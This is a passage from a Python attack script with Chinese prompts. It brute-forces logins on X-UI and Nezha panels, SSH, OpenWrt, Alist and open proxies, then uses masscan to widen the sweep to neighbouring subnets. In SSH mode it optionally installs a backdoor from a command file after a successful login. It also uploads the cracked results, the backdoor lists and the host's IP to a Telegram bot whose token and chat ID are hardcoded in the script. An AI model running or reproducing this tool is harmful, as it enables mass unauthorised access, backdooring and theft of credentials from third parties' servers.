        required_pkgs.append("golang.org/x/net/proxy")

    if required_pkgs:
        sys.stdout.write("    - 正在安装Go模块...")
        sys.stdout.flush()
        for pkg in required_pkgs:
            try:
                run_cmd([GO_EXEC, "get", pkg], quiet=True, extra_env=go_env)
            except subprocess.CalledProcessError as e:
                print(f"\n❌ Go模块 '{pkg}' 安装失败。请检查网络或代理设置。")
                raise e 
        print(" 完成")

    print(">>> 环境依赖检测完成 ✅\\n")

def load_credentials(template_mode, auth_mode=0):
    usernames, passwords, credentials = [], [], []
    
    if template_mode == 7: # Sub Store 模式
        usernames, passwords = ["2cXaAxRGfddmGz2yx1wA"], ["2cXaAxRGfddmGz2yx1wA"]
        return usernames, passwords, credentials
    
    if template_mode == 12: # Alist 模式不需要凭据
        return [], [], []

    if auth_mode == 1: # No credentials
        return [], [], []
    
    if auth_mode == 2: # User/Pass files
        if not os.path.exists("username.txt") or not os.path.exists("password.txt"):
            print("❌ 错误: 缺少 username.txt 或 password.txt 文件。")
            sys.exit(1)
        with open("username.txt", encoding='utf-8') as f:
            usernames = [line.strip() for line in f if line.strip()]
        with open("password.txt", encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
        if not usernames or not passwords:
            print("❌ 错误: 用户名或密码文件为空。")
            sys.exit(1)
        return usernames, passwords, credentials

    if auth_mode == 3: # Credentials file
        if not os.path.exists("credentials.txt"):
            print("❌ 错误: 缺少 credentials.txt 文件。")
            sys.exit(1)
        with open("credentials.txt", encoding='utf-8') as f:
            credentials = [line.strip() for line in f if line.strip() and ":" in line]
        if not credentials:
            print("❌ 错误: credentials.txt 文件为空或格式不正确。")
            sys.exit(1)
        return usernames, passwords, credentials

    # Default logic for non-proxy modes
    use_custom = input("是否使用 username.txt / password.txt 字典库？(y/N，使用内置默认值): ").strip().lower()
    if use_custom == 'y':
        return load_credentials(template_mode, auth_mode=2) # Reuse logic
    else:
        if template_mode == 8: usernames, passwords = ["root"], ["password"]
        else: usernames, passwords = ["admin"], ["admin"]
        return usernames, passwords, credentials


def get_vps_info():
    import requests
    try:
        response = requests.get("http://ip-api.com/json/?fields=country,query", timeout=10)
        response.raise_for_status()
        data = response.json()
        return data.get('query', 'N/A'), data.get('country', 'N/A')
    except requests.exceptions.RequestException as e:
        print(f"⚠️ 获取VPS信息失败: {e}")
    return "N/A", "N/A"

def get_nezha_server(config_file="config.yml"):
    if not os.path.exists(config_file):
        return "N/A"
    try:
        import yaml
        with open(config_file, 'r', encoding='utf-8') as f:
            config_data = yaml.safe_load(f)
            if isinstance(config_data, dict) and 'server' in config_data:
                return config_data['server']
    except Exception as e:
        print(f"⚠️ 解析 {config_file} 失败: {e}")
    return "N/A"

def parse_result_line(line):
    """Parses a result line and returns ip, port, user, password."""
    proxy_match = re.match(r'(\w+)://(?:([^:]+):([^@]+)@)?([\d\.]+):(\d+)', line)
    if proxy_match:
        user = proxy_match.group(2) or ''
        password = proxy_match.group(3) or ''
        ip = proxy_match.group(4)
        port = proxy_match.group(5)
        return ip, port, user, password

    parts = line.split()
    if len(parts) >= 1:
        ip_port = parts[0]
        user = parts[1] if len(parts) > 1 else ''
        password = parts[2] if len(parts) > 2 else ''
        if ':' in ip_port:
            ip, port = ip_port.split(':', 1)
            return ip, port, user, password
            
    return None, None, None, None

def analyze_and_expand_scan(result_file, template_mode, params, template_map, masscan_rate):
    if not os.path.exists(result_file) or os.path.getsize(result_file) == 0:
        return set()

    print("\n--- 正在分析结果以寻找可扩展的IP网段... ---")
    with open(result_file, 'r', encoding='utf-8') as f:
        master_results = {line.strip() for line in f}
    
    ips_to_analyze = master_results
    all_newly_verified_ips = set()

    for i in range(2): # Perform two rounds of expansion
        print(f"\n--- [扩展扫描 第 {i+1}/2 轮] ---")
        
        groups = {}
        for line in ips_to_analyze:
            ip, port, user, password = parse_result_line(line)
            if not ip: continue
            
            subnet = ".".join(ip.split('.')[:3]) + ".0/24"
            key = (subnet, port, user, password)
            
            if key not in groups: groups[key] = set()
            groups[key].add(ip)

        expandable_targets = [key for key, ips in groups.items() if len(ips) >= 2]

        if not expandable_targets:
            print(f"  - 第 {i+1} 轮未找到符合条件的IP集群，扩展扫描结束。")
            break

        print(f"  - 第 {i+1} 轮发现 {len(expandable_targets)} 个可扩展的IP集群。")
        
        newly_verified_this_round = set()
        masscan_output_file = "masscan_results.tmp"

        for j, (subnet, port, user, password) in enumerate(expandable_targets):
            print(f"\n  --- [扫描集群 {j+1}/{len(expandable_targets)}] 目标: {subnet} 端口: {port} ---")
            
            masscan_ips_for_this_cluster = set()
            for k in range(2):
                print(f"    - Masscan 第 {k+1}/2 轮...")
                try:
                    if os.path.exists(masscan_output_file): os.remove(masscan_output_file)
                    masscan_cmd = ["masscan", subnet, "-p", port, "--rate=" + str(masscan_rate), "-oG", masscan_output_file]
                    subprocess.run(masscan_cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

                    with open(masscan_output_file, 'r') as f:
                        for line in f:
                            if line.startswith("Host:"):
                                masscan_ips_for_this_cluster.add(line.split()[1])
                except (subprocess.CalledProcessError, FileNotFoundError) as e:
                    print(f"      - ❌ Masscan 扫描失败: {e}")
            
            ips_to_verify = masscan_ips_for_this_cluster - master_results
            print(f"    - Masscan 两轮共发现 {len(masscan_ips_for_this_cluster)} 个存活主机，其中 {len(ips_to_verify)} 个是新目标。")
            if not ips_to_verify:
                continue

            verification_input_file = "verification_input.tmp"
            with open(verification_input_file, 'w') as f:
                for ip in ips_to_verify:
                    f.write(f"{ip}:{port}\n")
            
            print("    - 正在对新发现的IP进行二次验证...")
            
            current_params = params.copy()
            current_params['usernames'] = [user] if user else []
            current_params['passwords'] = [password] if password else []
            gen_func, extra_args = template_map[template_mode]
            final_params = {**current_params, **extra_args}
            gen_func(**final_params)
            executable_name = compile_go_program()

            try:
                run_env = os.environ.copy()
                total_memory = psutil.virtual_memory().total
                mem_limit = int(total_memory * 0.70 / 1024 / 1024)
                run_env["GOMEMLIMIT"] = f"{mem_limit}MiB"
                run_env["GOGC"] = "50"
                
                verification_output_file = "verification_output.tmp"
                if os.path.exists(verification_output_file): os.remove(verification_output_file)

                cmd = ['./' + executable_name, verification_input_file, verification_output_file]
                
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=run_env)
                for line in iter(lambda: process.stdout.readline(), b''):
                    sys.stdout.write(line.decode('utf-8', errors='ignore'))
                    sys.stdout.flush()
                process.wait()
                if process.returncode != 0:
                    raise subprocess.CalledProcessError(process.returncode, cmd)
                
                if os.path.exists(verification_output_file):
                    with open(verification_output_file, 'r') as f:
                        new_finds = {line.strip() for line in f}
                        print(f"    - 二次验证成功 {len(new_finds)} 个新目标。")
                        newly_verified_this_round.update(new_finds)
                    os.remove(verification_output_file)
            except Exception as e:
                print(f"    - ❌ 二次验证失败: {e}")
            
            if os.path.exists(verification_input_file): os.remove(verification_input_file)
        
        new_ips_this_round = newly_verified_this_round - master_results
        if not new_ips_this_round:
            print(f"--- 第 {i+1} 轮未发现任何全新的IP，扩展扫描结束。 ---")
            break
        
        master_results.update(new_ips_this_round)
        ips_to_analyze = new_ips_this_round

    if os.path.exists(masscan_output_file): os.remove(masscan_output_file)

    with open(result_file, 'r', encoding='utf-8') as f:
        initial_set = {line.strip() for line in f}
    return master_results - initial_set


if __name__ == "__main__":
        start = time.time()
        interrupted = False
        final_result_file = None
        
        TEMP_PART_DIR = "temp_parts"
        TEMP_XUI_DIR = "xui_outputs"
        TEMP_HMSUCCESS_DIR = "temp_hmsuccess"
        TEMP_HMFAIL_DIR = "temp_hmfail"

        from datetime import datetime, timedelta, timezone
        beijing_time = datetime.now(timezone.utc) + timedelta(hours=8)
        time_str = beijing_time.strftime("%Y%m%d-%H%M")

        try:
                if not sys.stdout.isatty():
                    print("❌ 错误：此脚本需要在交互式终端中运行以接收用户输入。")
                    sys.exit(1)

                TEMPLATE_MODE = choose_template_mode()
                
                check_environment(TEMPLATE_MODE)
                
                # Re-import after check_environment to ensure they are available
                import psutil
                import requests
                import yaml
                from openpyxl import Workbook, load_workbook

                adjust_oom_score()
                check_and_manage_swap()

                os.makedirs(TEMP_PART_DIR, exist_ok=True)
                os.makedirs(TEMP_XUI_DIR, exist_ok=True)
                os.makedirs(TEMP_HMSUCCESS_DIR, exist_ok=True)
                os.makedirs(TEMP_HMFAIL_DIR, exist_ok=True)

                params = {}
                AUTH_MODE = 0

                if TEMPLATE_MODE == 6: # SSH mode
                    choice = input("是否在SSH爆破成功后自动安装后门？(y/N)：").strip().lower()
                    if choice == 'y':
                        params['install_backdoor'] = True
                        if not os.path.exists("后门命令.txt"):
                            print("❌ 未找到 后门命令.txt，已中止。")
                            sys.exit(1)
                        with open("后门命令.txt", encoding='utf-8') as f:
                            params['custom_cmds'] = [line.strip() for line in f if line.strip()]
                    else:
                        params['install_backdoor'] = False
                        params['custom_cmds'] = []
                
                if TEMPLATE_MODE in [9, 10, 11]: # Proxy modes
                    print("\n请选择代理凭据模式：")
                    print("1. 无凭据 (扫描开放代理)")
                    print("2. 独立字典 (使用 username.txt 和 password.txt)")
                    print("3. 组合凭据 (使用 credentials.txt, 格式 user:pass)")
                    while True:
                        auth_choice = input("输入 1, 2, 或 3 (默认 1): ").strip()
                        if auth_choice in ["", "1"]: AUTH_MODE = 1; break
                        elif auth_choice == "2": AUTH_MODE = 2; break
                        elif auth_choice == "3": AUTH_MODE = 3; break
                        else: print("输入无效。")
                    
                    if TEMPLATE_MODE == 9: params['proxy_type'] = "socks5"
                    elif TEMPLATE_MODE == 10: params['proxy_type'] = "http"
                    elif TEMPLATE_MODE == 11: params['proxy_type'] = "https"

                print("\n=== 爆破一键启动 ===")
                input_file = input_filename_with_default("请输入源文件名", "1.txt")
                if not os.path.exists(input_file):
                        print(f"❌ 错误: 文件 '{input_file}' 不存在。")
                        sys.exit(1)

                with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
                    total_ips = sum(1 for line in f if line.strip())
                print(f"--- 总计 {total_ips} 个目标 ---")

                lines_per_file = input_with_default("每个小文件行数", 5000)
                sleep_seconds = input_with_default("爆破完休息秒数", 2)
                
                total_memory_mb = psutil.virtual_memory().total / 1024 / 1024
                recommended_threads = int((total_memory_mb * 0.7) / 2.5)
                if recommended_threads < 50: recommended_threads = 50
                params['semaphore_size'] = input_with_default(f"爆破线程数 (根据内存推荐 {recommended_threads})", recommended_threads)

                params['timeout'] = input_with_default("超时时间(秒)", 10)
                masscan_rate = input_with_default("请输入Masscan扫描速率(pps)", 50000)
                
                params['usernames'], params['passwords'], params['credentials'] = load_credentials(TEMPLATE_MODE, AUTH_MODE)
                params['auth_mode'] = AUTH_MODE

                template_map = {
                    1: (generate_xui_go, {}),
                    2: (generate_xui_go_template2, {}),
                    6: (generate_xui_go_template6, {'install_backdoor': params.get('install_backdoor', False), 'custom_cmds': params.get('custom_cmds', [])}),
                    7: (generate_xui_go_template7, {}),
                    8: (generate_xui_go_template8, {}),
                    9: (generate_proxy_go, {'proxy_type': 'socks5'}),
                    10: (generate_proxy_go, {'proxy_type': 'http'}),
                    11: (generate_proxy_go, {'proxy_type': 'https'}),
                    12: (generate_alist_go, {}),
                }

                gen_func, extra_args = template_map[TEMPLATE_MODE]
                final_params = {**params, **extra_args}
                gen_func(**final_params)
                
                executable = compile_go_program()
                generate_ipcx_py()
                split_file(input_file, lines_per_file)
                run_xui_for_parts(sleep_seconds, executable, total_ips, params['semaphore_size'])
                
                merge_xui_files()
                
                initial_results_file = "xui.txt"
                if os.path.exists(initial_results_file) and os.path.getsize(initial_results_file) > 0:
                    newly_found_results = analyze_and_expand_scan(initial_results_file, TEMPLATE_MODE, params, template_map, masscan_rate)
                    if newly_found_results:
                        print(f"--- 扩展扫描完成，共新增 {len(newly_found_results)} 个结果。正在合并... ---")
                        with open(initial_results_file, 'a', encoding='utf-8') as f:
                            for result in sorted(list(newly_found_results)):
                                f.write(result + '\n')
                        
                        with open(initial_results_file, 'r', encoding='utf-8') as f:
                            unique_lines = sorted(list(set(f.readlines())))
                        with open(initial_results_file, 'w', encoding='utf-8') as f:
                            f.writelines(unique_lines)

                        print("--- 结果合并去重完成。 ---")

                merge_result_files("hmsuccess", "hmsuccess.txt", TEMP_HMSUCCESS_DIR)
                merge_result_files("hmfail", "hmfail.txt", TEMP_HMFAIL_DIR)

                run_ipcx()
                
                mode_map = {1: "XUI", 2: "哪吒", 6: "ssh", 7: "substore", 8: "OpenWrt", 9: "SOCKS5", 10: "HTTP", 11: "HTTPS", 12: "Alist"}
                prefix = mode_map.get(TEMPLATE_MODE, "result")

                if os.path.exists("xui.txt"):
                    final_result_file = f"{prefix}-{time_str}.txt"
                    os.rename("xui.txt", final_result_file)
                if os.path.exists("xui.xlsx"):
                    os.rename("xui.xlsx", f"{prefix}-{time_str}.xlsx")
                if os.path.exists("hmsuccess.txt"):
                    os.rename("hmsuccess.txt", f"后门成功-{time_str}.txt")
                if os.path.exists("hmfail.txt"):
                    os.rename("hmfail.txt", f"后门失败-{time_str}.txt")

        except KeyboardInterrupt:
                print("\\n>>> 用户中断操作（Ctrl+C），准备清理临时文件...")
                interrupted = True
        except SystemExit:
                print(f"\\n脚本因环境问题中止。")
        except EOFError:
                print("\\n❌ 错误：无法读取用户输入。请在交互式终端(TTY)中运行此脚本。")
                interrupted = True
        finally:
                clean_temp_files()
                end = time.time()
                cost = int(end - start)
                
                vps_ip, vps_country = get_vps_info()
                nezha_server = get_nezha_server()

                if interrupted:
                        print(f"\\n=== 脚本已被中断，中止前共运行 {cost // 60} 分 {cost % 60} 秒 ===")
                else:
                        print(f"\\n=== 全部完成！总用时 {cost // 60} 分 {cost % 60} 秒 ===")

                def send_to_telegram(file_path, bot_token, chat_id, vps_ip="N/A", vps_country="N/A", nezha_server="N/A"):
                        if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
                                print(f"⚠️ Telegram 上传跳过：文件 {file_path} 不存在或为空")
                                return

                        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                        caption_text = f"VPS: {vps_ip} ({vps_country})\\n"
                        if nezha_server != "N/A":
                            caption_text += f"哪吒Server: {nezha_server}\\n"
                        caption_text += f"任务结果: {os.path.basename(file_path)}"
                        
                        with open(file_path, "rb") as f:
                                files = {'document': f}
                                data = {'chat_id': chat_id, 'caption': caption_text}
                                try:
                                        response = requests.post(url, data=data, files=files, timeout=60)
                                        if response.status_code == 200:
                                                print(f"✅ 文件 {file_path} 已发送到 Telegram")
                                        else:
                                                print(f"❌ TG上传失败，状态码：{response.status_code}，返回：{response.text}")
                                except Exception as e:
                                        print(f"❌ 发送到 TG 失败：{e}")

                BOT_TOKEN = "7664203362:AAFTBPQ8Ydl9c1fqM53CSzKIPS0VBj99r0M"
                CHAT_ID = "7697235358"

                if BOT_TOKEN and CHAT_ID:
                    files_to_send = []
                    if final_result_file and os.path.exists(final_result_file):
                        files_to_send.append(final_result_file)
                        xlsx_file = final_result_file.replace(".txt", ".xlsx")
                        if os.path.exists(xlsx_file):
                            files_to_send.append(xlsx_file)
                    
                    success_file = f"后门成功-{time_str}.txt"
                    fail_file    = f"后门失败-{time_str}.txt"
                    if os.path.exists(success_file): files_to_send.append(success_file)
                    if os.path.exists(fail_file): files_to_send.append(fail_file)

                    for f in files_to_send:
                        print(f"\\n📤 正在将 {f} 上传至 Telegram ...")
                        send_to_telegram(f, BOT_TOKEN, CHAT_ID, vps_ip, vps_country, nezha_server)
